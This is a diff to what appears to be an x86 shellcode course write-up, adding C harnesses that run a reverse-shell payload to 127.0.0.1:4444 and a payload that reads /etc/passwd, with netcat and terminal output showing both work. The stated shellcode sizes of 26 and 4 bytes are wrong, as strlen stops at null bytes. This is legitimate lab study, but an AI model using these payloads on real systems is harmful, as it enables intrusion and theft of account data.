@@ -190,6 +190,56 @@ unsigned char buf[] =
 "\x52\x53\x89\xe1\xb0\x0b\xcd\x80";
 ```
 
+A C program scripted with the newly generated shellcode:
+
+```c
+/**
+* Filename: reverseshell_shellcode.c
+* Author: h3ll0clar1c3
+* Purpose: Reverse shell connecting back to IP address 127.0.0.1 on TCP port 4444  
+* Compilation: gcc -fno-stack-protector -z execstack -m32 reverseshell_shellcode.c -o reverseshell  
+* Usage: ./reverseshell
+* Testing: nc -lv 4444
+* Shellcode size: 26 bytes
+* Architecture: x86
+**/
+
+#include <stdio.h>
+#include <string.h>
+
+unsigned char code[] = \
+"\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80"
+"\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x68\x7f\x00\x00\x01\x68"
+"\x02\x00\x11\x5c\x89\xe1\xb0\x66\x50\x51\x53\xb3\x03\x89\xe1"
+"\xcd\x80\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3"
+"\x52\x53\x89\xe1\xb0\x0b\xcd\x80";
+
+int main()
+{
+        printf("Shellcode length:  %d\n", strlen(code));
+        int (*ret)() = (int(*)())code;
+        ret();
+}
+```
+
+As a POC, the C program is compiled as an executable binary with stack-protection disabled, and executed resulting in a shellcode size of 26 bytes:
+
+```bash
+osboxes@osboxes:~/Downloads/SLAE$ gcc -fno-stack-protector -zexecstack reverseshell_shellcode.c -o reverseshell
+osboxes@osboxes:~/Downloads/SLAE$ ./reverseshell 
+Shellcode length:  26
+
+```
+
+A separate terminal demonstrating a successful reverse connection and shell on the local host (via port 4444):
+
+```bash
+osboxes@osboxes:~$ nc -lv 4444
+Connection from 127.0.0.1 port 4444 [tcp/*] accepted
+id
+uid=1000(osboxes) gid=1000(osboxes) groups=1000(osboxes),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),109(lpadmin),124(sambashare)
+```
+
 The Sctest tool, part of the Libemu test suite, is used to inspect the program code and analyze the system calls:
 
 ```bash
@@ -266,6 +316,51 @@ unsigned char buf[] =
 "\x01\x00\x00\x00\xbb\x00\x00\x00\x00\xcd\x80\xe8\xc5\xff\xff"
 "\xff\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64\x00";
 ```
+
+A C program scripted with the newly generated shellcode:
+
+```c
+/**
+* Filename: readfile_shellcode.c
+* Author: h3ll0clar1c3
+* Purpose: Read a specified file on the local host  
+* Compilation: gcc -fno-stack-protector -z execstack -m32 readfile_shellcode.c -o readfile  
+* Usage: ./readfile
+* Shellcode size: 4 bytes
+* Architecture: x86
+**/
+
+#include <stdio.h>
+#include <string.h>
+
+unsigned char code[] = \
+"\xeb\x36\xb8\x05\x00\x00\x00\x5b\x31\xc9\xcd\x80\x89\xc3\xb8"
+"\x03\x00\x00\x00\x89\xe7\x89\xf9\xba\x00\x10\x00\x00\xcd\x80"
+"\x89\xc2\xb8\x04\x00\x00\x00\xbb\x01\x00\x00\x00\xcd\x80\xb8"
+"\x01\x00\x00\x00\xbb\x00\x00\x00\x00\xcd\x80\xe8\xc5\xff\xff"
+"\xff\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64\x00";
+
+int main()
+{
+        printf("Shellcode length:  %d\n", strlen(code));
+        int (*ret)() = (int(*)())code;
+        ret();
+}
+```
+
+As a POC, the C program is compiled as an executable binary with stack-protection disabled, and executed resulting in a shellcode size of 4 bytes:
+
+```bash
+osboxes@osboxes:~/Downloads/SLAE$ gcc -fno-stack-protector -zexecstack readfile_shellcode.c -o readfile
+osboxes@osboxes:~/Downloads/SLAE$ ./readfile 
+Shellcode length:  4
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+bin:x:2:2:bin:/bin:/bin/sh
+www-data:x:33:33:www-data:/var/www:/bin/sh
+osboxes:x:1000:1000:osboxes.org,,,:/home/osboxes:/bin/bash
+```
+
 The Ndiasm tool (similar to GDB) is used to step through the program code and analyze the system calls:
 
 ```bash
